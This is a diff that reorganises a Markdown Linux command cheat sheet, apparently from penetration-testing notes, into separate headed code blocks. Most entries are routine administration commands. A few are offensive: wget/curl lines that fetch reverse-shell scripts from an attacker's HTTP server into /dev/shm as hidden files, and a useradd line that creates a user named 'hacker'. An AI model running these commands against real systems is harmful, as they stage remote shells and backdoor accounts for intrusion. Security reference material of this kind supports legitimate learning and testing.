@@ -60,22 +60,6 @@ cat file | sort | uniq #Sort and delete duplicates
 #Replace in file
 sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
 
-#Download in RAM
-wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
-wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
-curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
-
-#Files used by network processes
-lsof #Open files belonging to any process
-lsof -p 3 #Open files used by the process
-lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
-lsof +D /lib #Processes using files inside the indicated dir
-lsof -i :80 #Files uses by networks processes
-fuser -nv tcp 80
-
 #Decompress
 tar -xvzf /path/to/yourfile.tgz
 tar -xvjf /path/to/yourfile.tbz
@@ -85,6 +69,7 @@ gunzip /path/to/yourfile.gz
 unzip file.zip
 7z -x file.7z
 sudo apt-get install xz-utils; unxz file.xz
+
 
 #Add new user
 useradd -p 'openssl passwd -1 <Password>' hacker  
@@ -98,26 +83,63 @@ python3 -m http.server
 ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
 php -S $ip:80
 
-#Curl
-#json data
-curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
-#Auth via JWT
-curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
-
-#Send Email
-sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content
-
 #DD copy hex bin file without first X (28) bytes
 dd if=file.bin bs=28 skip=1 of=blob
+
 
 #Mount .vhd files (virtual hard drive)
 sudo apt-get install libguestfs-tools
 guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd
 
-# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
-ssh-keyscan 10.10.10.101
 
-# Openssl
+#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
+echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
+
+# List files inside zip
+7z l file.zip
+```
+
+### Download in RAM
+```bash
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+```
+
+### Files used by network processes
+```bash
+lsof #Open files belonging to any process
+lsof -p 3 #Open files used by the process
+lsof -i #Files used by networks processes
+lsof -i 4 #Files used by network IPv4 processes
+lsof -i 6 #Files used by network IPv6 processes
+lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof +D /lib #Processes using files inside the indicated dir
+lsof -i :80 #Files uses by networks processes
+fuser -nv tcp 80
+```
+
+### Curl
+```bash
+#json data
+curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
+#Auth via JWT
+curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
+```
+
+### Send Email
+```bash
+sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content
+```
+
+
+### ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
+```bash
+ssh-keyscan 10.10.10.101
+```
+
+### Openssl
+```bash
 openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
 openssl x509 -in ca.cert.pem -text #Read certificate
 openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
@@ -134,28 +156,33 @@ openssl rsa -in key.ssh.enc -out key.ssh
 
 #Decrypt
 openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
+```
 
-#Count number of instructions executed by a program, need a host based linux (not working in VM)
+### Count number of instructions executed by a program, need a host based linux (not working in VM)
+```bash
 perf stat -x, -e instructions:u "ls"
+```
 
-#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
+### Find trick for HTB, find files from 2018-12-12 to 2018-12-14
+```bash
 find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
+```
 
-#Reconfigure timezone
+### Reconfigure timezone
+```bash
 sudo dpkg-reconfigure tzdata
+```
 
-#Search from which package is a binary
+### Search from which package is a binary
+```bash
 apt-file search /usr/bin/file #Needed: apt-get install apt-file
+```
 
-#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
-echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
 
-#Set not removable bit
+### Set not removable bit
+```bash
 sudo chattr +i file.txt
 sudo chattr -i file.txt #Remove the bit so you can delete it
-
-# List files inside zip
-7z l file.zip
 ```
 
 ### Greps
